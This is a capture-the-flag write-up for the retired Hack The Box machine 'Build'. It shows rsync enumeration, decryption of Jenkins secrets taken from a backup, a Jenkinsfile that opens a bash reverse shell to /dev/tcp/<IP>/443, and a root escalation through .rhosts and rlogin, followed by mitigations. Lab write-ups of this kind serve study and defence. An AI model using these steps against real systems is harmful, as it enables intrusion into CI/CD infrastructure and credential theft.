---
machine: Build
os: Linux
difficulty: Medium
platform: Hack The Box
category: Web
state: Retired
pwned: false
tags: [linux, jenkins, gitea, rsync, docker, powerdns, rlogin]
---

# Build — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference note; no real credentials or flags.

## Summary

A server with rsync, Gitea and Jenkins in containers. A Jenkins backup exposed over rsync allows decrypting a secret and entering Gitea. The repository holds a Jenkins pipeline that can be modified to run commands; the shell lands in a container. From there, PowerDNS-Admin and MySQL are reachable, host access is obtained, and `.rhosts`/rlogin is abused for root.

## Enumeration

```bash
nmap -p- --min-rate 5000 -T4 <IP>
rsync rsync://<IP>/
```

The backup module contains the Jenkins directory. Download it and review `credentials.xml`, `hudson.util.Secret` and `master.key`:

```bash
rsync -av rsync://<IP>/<MODULE> ./backup
```

Use the master key to decrypt the Jenkins secret (`jenkins-decrypt` or the script for the matching version). The resulting credential grants Gitea access on port 3000.

## Initial access

Gitea hosts a repository with a `Jenkinsfile`. The pipeline runs in Jenkins and allows changing the build command:

```groovy
pipeline {
  agent any
  stages {
    stage('build') {
      steps {
        sh 'bash -c "bash -i >& /dev/tcp/<IP>/443 0>&1"'
      }
    }
  }
}
```

Save and run the pipeline; the shell arrives as root inside the Jenkins container.

## Escalation

```bash
hostname -I
ip addr
nmap -p- 172.18.0.0/24 --min-rate 5000
```

The Docker network shows Gitea, the Jenkins webhook, MySQL and PowerDNS-Admin. MySQL accepts `root` without a password; PowerDNS-Admin is compromised with backup credentials. On the host, `.rhosts` allows `root` from a specific hostname. Change the container hostname and use `rlogin`:

```bash
hostname <ALLOWED_HOST>
rlogin -l root 172.18.0.1
```

The session is root on the host.

## Flags

- `user.txt`: `<USER_FLAG>`
- `root.txt`: `<ROOT_FLAG>`

## Lessons

- A CI/CD backup contains secrets that decrypt credentials.
- An editable pipeline is code execution by design.
- The internal Docker network exposes unauthenticated services.
- `.rhosts` and rlogin still appear in legacy environments.

## Detection and mitigation

- Protect Jenkins backups and rotate `master.key`/credentials.
- Restrict who can edit pipelines and run builds.
- Do not expose MySQL/PowerDNS-Admin on the internal network without authentication.
- Remove `.rhosts`, disable rlogin and segment containers.

## References

- <https://0xdf.gitlab.io/2025/08/05/htb-build.html>
- <https://www.jenkins.io/doc/book/security/>
- <https://attack.mitre.org/techniques/T1195/002/>
